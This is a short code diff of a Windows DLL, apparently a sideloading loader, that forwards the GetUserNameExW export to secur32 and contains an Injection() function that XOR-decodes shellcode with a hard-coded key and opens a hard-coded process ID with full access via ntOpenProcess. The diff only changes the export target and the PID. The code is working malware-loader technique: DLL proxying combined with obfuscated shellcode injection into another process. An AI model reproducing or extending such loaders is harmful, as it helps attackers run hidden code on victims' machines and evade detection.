@@ -1,6 +1,7 @@
 #include "Library.h"
 
-#pragma comment(linker, "/export:GetUserNameExW=updater.GetUserNameExW")
+#pragma comment(linker, "/export:GetUserNameExW=C:\\Windows\\System32\\secur32.GetUserNameExW")
+
 
 unsigned char KEY[] = { 0x04, 0x05, 0x06, 0x07, 0x08, 0x09,0x02,0x01 };
 
@@ -71,7 +72,7 @@ VOID Injection()
 	XorByInputKey(shellcode, sizeof shellcode, KEY, sizeof(KEY));
 
 	clientId.UniqueThread = NULL;
-	clientId.UniqueProcess = (HANDLE)(ULONG_PTR)1472;
+	clientId.UniqueProcess = (HANDLE)(ULONG_PTR)5028;
 	status = ntOpenProcess(&hProc, PROCESS_ALL_ACCESS, &objAttr, &clientId);
 
 	if (!NT_SUCCESS(status)) {
